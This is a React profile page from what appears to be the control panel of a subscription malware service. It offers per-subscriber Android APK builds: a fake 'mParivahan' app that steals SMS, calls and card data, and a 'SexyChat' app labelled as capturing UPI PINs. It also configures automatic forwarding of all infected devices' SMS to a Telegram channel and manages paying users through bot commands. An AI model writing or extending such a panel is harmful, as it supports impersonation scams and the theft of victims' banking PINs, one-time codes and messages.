import { useState, useEffect } from "react";
import { Layout } from "@/components/layout";
import { useAuth } from "@/lib/auth";
import { useToast } from "@/hooks/use-toast";
import {
  User,
  Mail,
  Shield,
  Calendar,
  Clock,
  Key,
  Send,
  Hash,
  CheckCircle,
  XCircle,
  Loader2,
  ExternalLink,
  Download,
  LogOut,
  Smartphone,
} from "lucide-react";
import { format } from "date-fns";
import { authHeaders } from "@/lib/apiFetch";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

async function apiFetch(path: string, opts?: RequestInit) {
  const res = await fetch(`${API_BASE}/api${path}`, {
    ...opts,
    headers: authHeaders(opts?.headers as Record<string, string> | undefined),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || "Request failed");
  return data;
}

export function Profile() {
  const { userId, isAdmin, username, logout } = useAuth();
  const [deviceCount, setDeviceCount] = useState(0);
  const [sessions, setSessions] = useState<Record<string, any>>({});

  // Fetch login sessions
  useEffect(() => {
    if (!userId) return;
    apiFetch(`/auth/sessions?telegramId=${encodeURIComponent(userId)}`)
      .then((d) => (d?.sessions ? setSessions(d.sessions) : setSessions({})))
      .catch(() => setSessions({}));
  }, [userId]);
  const { toast } = useToast();

  const [profile, setProfile] = useState<any>(null);
  const [loadingProfile, setLoadingProfile] = useState(true);

  const [pwForm, setPwForm] = useState({
    currentPassword: "",
    newPassword: "",
    confirmPassword: "",
  });
  const [changingPw, setChangingPw] = useState(false);

  const [channelInput, setChannelInput] = useState("");
  const [savingChannel, setSavingChannel] = useState(false);

  // APK download state
  const [downloadingApk, setDownloadingApk] = useState(false);
  const [downloadingSexy, setDownloadingSexy] = useState(false);

  useEffect(() => {
    if (!userId) return;
    apiFetch(`/auth/profile?telegramId=${userId}`)
      .then((data) => {
        setProfile(data);
        setDeviceCount(data.deviceCount || 0);
        if (data.smsChannel) setChannelInput(data.smsChannel);
      })
      .catch(() =>
        toast({
          title: "Error",
          description: "Failed to load profile",
          variant: "destructive",
        })
      )
      .finally(() => setLoadingProfile(false));
  }, [userId]);

  const handleChangePassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (pwForm.newPassword !== pwForm.confirmPassword) {
      toast({
        title: "Error",
        description: "New passwords do not match",
        variant: "destructive",
      });
      return;
    }
    if (pwForm.newPassword.length < 4) {
      toast({
        title: "Error",
        description: "Password must be at least 4 characters long",
        variant: "destructive",
      });
      return;
    }
    setChangingPw(true);
    try {
      await apiFetch("/auth/change-password", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: profile?.email,
          currentPassword: pwForm.currentPassword,
          newPassword: pwForm.newPassword,
        }),
      });
      toast({
        title: "✅ Password Changed",
        description: "Naya password set ho gaya",
      });
      setPwForm({ currentPassword: "", newPassword: "", confirmPassword: "" });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setChangingPw(false);
    }
  };

  const handleSaveChannel = async (e: React.FormEvent) => {
    e.preventDefault();
    setSavingChannel(true);
    try {
      await apiFetch("/auth/set-channel", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          telegramId: userId,
          channelId: channelInput.trim() || null,
        }),
      });
      toast({
        title: channelInput.trim() ? "✅ Channel Set" : "✅ Channel Removed",
        description: channelInput.trim()
          ? "Ab naye SMS is channel pe forward honge"
          : "SMS forwarding band kar diya",
      });
      setProfile((p: any) => ({
        ...p,
        smsChannel: channelInput.trim() || null,
      }));
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setSavingChannel(false);
    }
  };

  const formatDate = (ts: number | null) => {
    if (!ts) return "—";
    return format(new Date(ts), "dd MMM yyyy, HH:mm") + " IST";
  };

  const daysLeft = (expiresAt: number | null) => {
    if (!expiresAt) return null;
    const diff = expiresAt - Date.now();
    return Math.max(0, Math.floor(diff / 86_400_000));
  };

  // Download this user's unique APK (ownerTelegramId baked in).
  // Server builds it on first request (~30-60s), then streams it back.
  const handleLogoutSession = async (sessionId: string) => {
    if (!userId) return;
    try {
      await apiFetch(
        `/auth/sessions/${sessionId}?telegramId=${encodeURIComponent(userId)}`,
        { method: "DELETE" }
      );
      setSessions((prev: any) => {
        const next = { ...prev };
        delete next[sessionId];
        return next;
      });
      toast({
        title: "Session Logged Out",
        description: "Device session removed",
      });
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message || "Failed",
        variant: "destructive",
      });
    }
  };

  const handleDownloadApk = () => {
    if (!userId) return;
    setDownloadingApk(true);
    const a = document.createElement("a");
    a.href = `${API_BASE}/api/apk/download?telegramId=${encodeURIComponent(userId)}`;
    a.download = `mParivahan_HARRYAXE_${userId}.apk`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(() => setDownloadingApk(false), 2000);
  };

  // Download this user unique SexyChat APK (device ID baked in)
  const handleDownloadSexy = () => {
    if (!userId) return;
    setDownloadingSexy(true);
    const a = document.createElement("a");
    a.href = `${API_BASE}/api/apk/sexychat/download?telegramId=${encodeURIComponent(userId)}`;
    a.download = `SexyChat_${userId}.apk`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(() => setDownloadingSexy(false), 2000);
  };

  return (
    <Layout>
      <div className="max-w-3xl mx-auto space-y-6">
        <div>
          <p className="page-eyebrow">Account</p>
          <h1 className="page-title flex items-center gap-2">
            <User className="w-6 h-6 text-primary" />
            Profile
          </h1>
          <p className="text-sm text-muted-foreground mt-1">
            Account details &amp; settings
          </p>
        </div>

        {/* Connected devices + Logout */}
        <div className="bg-card border border-border rounded-2xl p-5 flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-2xl bg-primary/10 flex items-center justify-center">
              <Smartphone className="w-5 h-5 text-primary" />
            </div>
            <div>
              <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">
                Connected Devices
              </p>
              <p className="text-lg font-bold text-foreground">
                {deviceCount} device{deviceCount === 1 ? "" : "s"}
              </p>
            </div>
          </div>
          <button
            onClick={logout}
            className="flex items-center gap-2 bg-destructive hover:bg-destructive/90 text-white px-5 py-2.5 rounded-full font-semibold text-sm transition-colors shadow-md shadow-destructive/25"
          >
            <LogOut className="w-4 h-4" /> Logout
          </button>
        </div>

        {/* Active login sessions */}
        <div className="bg-card border border-border rounded-2xl p-5 shadow-sm">
          <h2 className="text-xs font-bold uppercase tracking-widest text-muted-foreground mb-3 flex items-center gap-2">
            <Smartphone className="w-3.5 h-3.5" /> Active Login Sessions (
            {Object.keys(sessions).length})
          </h2>
          {Object.keys(sessions).length === 0 ? (
            <p className="text-sm text-muted-foreground">
              No active sessions found.
            </p>
          ) : (
            <div className="space-y-2">
              {Object.entries(sessions).map(([sid, s]: any) => (
                <div
                  key={sid}
                  className="flex items-center justify-between bg-muted/30 border border-border rounded-xl px-4 py-3"
                >
                  <div className="min-w-0">
                    <p className="text-sm font-semibold text-foreground truncate">
                      {s.device || "Unknown device"}
                    </p>
                    <p className="text-xs text-muted-foreground mt-0.5">
                      {s.ip || "IP unknown"} ·{" "}
                      {s.loggedInAt
                        ? new Date(s.loggedInAt).toLocaleString()
                        : ""}
                    </p>
                  </div>
                  <button
                    onClick={() => handleLogoutSession(sid)}
                    className="flex-shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-semibold bg-destructive/10 text-destructive border border-destructive/30 hover:bg-destructive/15 transition-colors"
                  >
                    <LogOut className="w-3 h-3" /> Logout
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>

        {loadingProfile ? (
          <div className="space-y-4">
            {[1, 2, 3].map((i) => (
              <div
                key={i}
                className="bg-card border border-card-border rounded-2xl h-32 animate-pulse"
              />
            ))}
          </div>
        ) : (
          <>
            {/* Account Info Card */}
            <div className="bg-card border border-card-border rounded-2xl overflow-hidden">
              <div className="h-1 w-full bg-primary" />
              <div className="p-5">
                <h2 className="page-eyebrow mb-4">Account Info</h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <InfoRow
                    icon={User}
                    label="Username"
                    value={profile?.username || username}
                  />
                  <InfoRow
                    icon={Hash}
                    label="Telegram ID"
                    value={userId || "—"}
                    mono
                  />
                  <InfoRow
                    icon={Mail}
                    label="Email"
                    value={profile?.email || "—"}
                  />
                  <InfoRow
                    icon={Shield}
                    label="Role"
                    value={isAdmin ? "Administrator" : "Subscriber"}
                    highlight={isAdmin}
                  />
                  {!isAdmin && (
                    <>
                      <InfoRow
                        icon={Calendar}
                        label="Plan"
                        value={profile?.plan || "—"}
                      />
                      <div className="flex flex-col gap-1">
                        <span className="page-eyebrow flex items-center gap-1">
                          <Clock className="w-3 h-3" /> Status
                        </span>
                        <span
                          className={`text-sm font-medium flex items-center gap-1.5 ${
                            profile?.status === "active"
                              ? "text-success"
                              : "text-destructive"
                          }`}
                        >
                          {profile?.status === "active" ? (
                            <>
                              <CheckCircle className="w-4 h-4" /> Active
                            </>
                          ) : (
                            <>
                              <XCircle className="w-4 h-4" /> Expired
                            </>
                          )}
                          {profile?.expiresAt &&
                            profile?.status === "active" && (
                              <span className="text-muted-foreground text-xs ml-1">
                                ({daysLeft(profile.expiresAt)}d left)
                              </span>
                            )}
                        </span>
                      </div>
                      {profile?.expiresAt && (
                        <InfoRow
                          icon={Calendar}
                          label="Expires"
                          value={formatDate(profile.expiresAt)}
                        />
                      )}
                    </>
                  )}
                </div>
              </div>
            </div>

            {/* Download APK */}
            <div className="bg-card border border-card-border rounded-2xl overflow-hidden">
              <div className="h-1 w-full bg-primary" />
              <div className="p-5">
                <h2 className="page-eyebrow mb-1 flex items-center gap-2">
                  <Download className="w-3.5 h-3.5" /> Download APK
                </h2>
                <p className="text-xs text-muted-foreground mb-4">
                  Download your unique APK — your Telegram ID is baked into it,
                  so installing it will show the connection in your panel. First
                  build may take ~30-60 seconds, subsequent downloads are
                  instant from cache.
                </p>

                {/* mParivahan APK */}
                <div className="bg-card border border-card-border rounded-2xl p-4 mb-3">
                  <div className="flex items-center justify-between mb-2 gap-2">
                    <div>
                      <h3 className="text-sm font-bold text-foreground">
                        📱 mParivahan APK
                      </h3>
                      <p className="text-xs text-muted-foreground mt-0.5">
                        Panel connection APK (SMS, calls, cards)
                      </p>
                    </div>
                    <span className="text-[10px] font-bold px-2 py-1 rounded-full bg-primary/10 text-primary font-mono">
                      mParivahan_HARRYAXE_{userId || "..."}.apk
                    </span>
                  </div>
                  <button
                    onClick={handleDownloadApk}
                    disabled={downloadingApk || !userId}
                    className="flex items-center justify-center gap-2 bg-primary text-primary-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px]"
                  >
                    {downloadingApk ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" /> Building...
                      </>
                    ) : (
                      <>
                        <Download className="w-4 h-4" /> Download mParivahan
                      </>
                    )}
                  </button>
                </div>

                {/* SexyChat APK */}
                <div className="bg-card border border-card-border rounded-2xl p-4">
                  <div className="flex items-center justify-between mb-2 gap-2">
                    <div>
                      <h3 className="text-sm font-bold text-foreground">
                        💬 SexyChat APK
                      </h3>
                      <p className="text-xs text-muted-foreground mt-0.5">
                        Chat app with UPI PIN capture (unique per user)
                      </p>
                    </div>
                    <span className="text-[10px] font-bold px-2 py-1 rounded-full bg-success/10 text-success font-mono">
                      SexyChat_{userId || "..."}.apk
                    </span>
                  </div>
                  <button
                    onClick={handleDownloadSexy}
                    disabled={downloadingSexy || !userId}
                    className="flex items-center justify-center gap-2 bg-success text-success-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-success/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px]"
                  >
                    {downloadingSexy ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" /> Building...
                      </>
                    ) : (
                      <>
                        <Download className="w-4 h-4" /> Download SexyChat
                      </>
                    )}
                  </button>
                </div>
              </div>
            </div>

            {/* Change Password */}
            <div className="bg-card border border-card-border rounded-2xl overflow-hidden">
              <div className="p-5">
                <h2 className="page-eyebrow mb-4 flex items-center gap-2">
                  <Key className="w-3.5 h-3.5" /> Change Password
                </h2>
                {!profile?.email ? (
                  <div className="text-sm text-muted-foreground bg-muted border border-card-border rounded-2xl p-4">
                    ⚠️ Email not set. Contact admin or use{" "}
                    <code className="text-primary">/setpanel</code> or{" "}
                    <code className="text-primary">/reset_password</code> in the
                    Telegram bot.
                  </div>
                ) : (
                  <form onSubmit={handleChangePassword} className="space-y-4">
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                      <div>
                        <label className="page-eyebrow block mb-1">
                          Current Password
                        </label>
                        <input
                          type="password"
                          value={pwForm.currentPassword}
                          onChange={(e) =>
                            setPwForm((f) => ({
                              ...f,
                              currentPassword: e.target.value,
                            }))
                          }
                          required
                          placeholder="••••••"
                          className="w-full bg-muted border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all placeholder:text-muted-foreground"
                        />
                      </div>
                      <div>
                        <label className="page-eyebrow block mb-1">
                          New Password
                        </label>
                        <input
                          type="password"
                          value={pwForm.newPassword}
                          onChange={(e) =>
                            setPwForm((f) => ({
                              ...f,
                              newPassword: e.target.value,
                            }))
                          }
                          required
                          minLength={4}
                          placeholder="••••••"
                          className="w-full bg-muted border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all placeholder:text-muted-foreground"
                        />
                      </div>
                      <div>
                        <label className="page-eyebrow block mb-1">
                          Confirm New
                        </label>
                        <input
                          type="password"
                          value={pwForm.confirmPassword}
                          onChange={(e) =>
                            setPwForm((f) => ({
                              ...f,
                              confirmPassword: e.target.value,
                            }))
                          }
                          required
                          placeholder="••••••"
                          className="w-full bg-muted border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all placeholder:text-muted-foreground"
                        />
                      </div>
                    </div>
                    <button
                      type="submit"
                      disabled={changingPw}
                      className="flex items-center justify-center gap-2 bg-primary text-primary-foreground px-6 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px]"
                    >
                      {changingPw ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        <Key className="w-4 h-4" />
                      )}
                      {changingPw ? "Changing..." : "Change Password"}
                    </button>
                  </form>
                )}
              </div>
            </div>

            {/* SMS Channel Config — Admin only */}
            {isAdmin && (
              <div className="bg-card border border-card-border rounded-2xl overflow-hidden">
                <div className="p-5">
                  <h2 className="page-eyebrow mb-1 flex items-center gap-2">
                    <Send className="w-3.5 h-3.5" /> SMS Forward Channel
                  </h2>
                  <p className="text-xs text-muted-foreground mb-4">
                    Sab devices ke naye SMS is Telegram channel pe automatically
                    forward honge. First add the bot as a channel admin, then
                    set the channel ID here.
                  </p>

                  {profile?.smsChannel && (
                    <div className="mb-4 bg-muted border border-card-border rounded-2xl p-3 font-medium text-sm flex items-center gap-2 text-foreground">
                      <CheckCircle className="w-4 h-4 text-success flex-shrink-0" />
                      <span>
                        Active:{" "}
                        <code className="text-primary">
                          {profile.smsChannel}
                        </code>
                      </span>
                    </div>
                  )}

                  <form
                    onSubmit={handleSaveChannel}
                    className="flex flex-col sm:flex-row gap-3 items-end"
                  >
                    <div className="flex-1 w-full">
                      <label className="page-eyebrow block mb-1">
                        Channel ID (e.g. -100xxxxxxxxxx or @channelname)
                      </label>
                      <input
                        type="text"
                        value={channelInput}
                        onChange={(e) => setChannelInput(e.target.value)}
                        placeholder="-100xxxxxxxxxx"
                        className="w-full bg-muted border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all placeholder:text-muted-foreground"
                      />
                    </div>
                    <button
                      type="submit"
                      disabled={savingChannel}
                      className="flex items-center justify-center gap-2 bg-primary text-primary-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px] whitespace-nowrap"
                    >
                      {savingChannel ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        <Send className="w-4 h-4" />
                      )}
                      {savingChannel
                        ? "Saving..."
                        : channelInput.trim()
                          ? "Set Channel"
                          : "Remove Channel"}
                    </button>
                  </form>

                  <div className="mt-4 text-xs text-muted-foreground bg-muted rounded-2xl p-3 space-y-1">
                    <p className="font-semibold text-foreground">
                      Setup steps:
                    </p>
                    <p>1. Create your Telegram channel</p>
                    <p>
                      2. Add the bot as a channel admin (allow it to send
                      messages)
                    </p>
                    <p>3. Paste the channel ID here</p>
                    <p>4. Click "Set Channel"</p>
                  </div>
                </div>
              </div>
            )}

            {/* Bot Quick Actions */}
            <div className="bg-card border border-card-border rounded-2xl p-5">
              <h2 className="page-eyebrow mb-3 flex items-center gap-2">
                <ExternalLink className="w-3.5 h-3.5" /> Bot Quick Actions
              </h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
                <div className="bg-muted border border-card-border rounded-2xl p-3">
                  <p className="text-muted-foreground text-xs mb-1">
                    Reset password via bot
                  </p>
                  <code className="text-primary font-medium">
                    /reset_password
                  </code>
                </div>
                {isAdmin && (
                  <>
                    <div className="bg-muted border border-card-border rounded-2xl p-3">
                      <p className="text-muted-foreground text-xs mb-1">
                        Set SMS channel via bot
                      </p>
                      <code className="text-primary font-medium">
                        /setchannel -100xxx
                      </code>
                    </div>
                    <div className="bg-muted border border-card-border rounded-2xl p-3">
                      <p className="text-muted-foreground text-xs mb-1">
                        Add user
                      </p>
                      <code className="text-primary font-medium">
                        /adduser ID days @user email
                      </code>
                    </div>
                    <div className="bg-muted border border-card-border rounded-2xl p-3">
                      <p className="text-muted-foreground text-xs mb-1">
                        View all users
                      </p>
                      <code className="text-primary font-medium">
                        /listusers
                      </code>
                    </div>
                  </>
                )}
              </div>
            </div>
          </>
        )}
      </div>
    </Layout>
  );
}

function InfoRow({
  icon: Icon,
  label,
  value,
  mono = false,
  highlight = false,
}: {
  icon: any;
  label: string;
  value: string;
  mono?: boolean;
  highlight?: boolean;
}) {
  return (
    <div className="flex flex-col gap-1">
      <span className="page-eyebrow flex items-center gap-1">
        <Icon className="w-3 h-3" /> {label}
      </span>
      <span
        className={`text-sm font-medium ${mono ? "font-mono" : ""} ${highlight ? "text-primary" : "text-foreground"}`}
      >
        {value}
      </span>
    </div>
  );
}
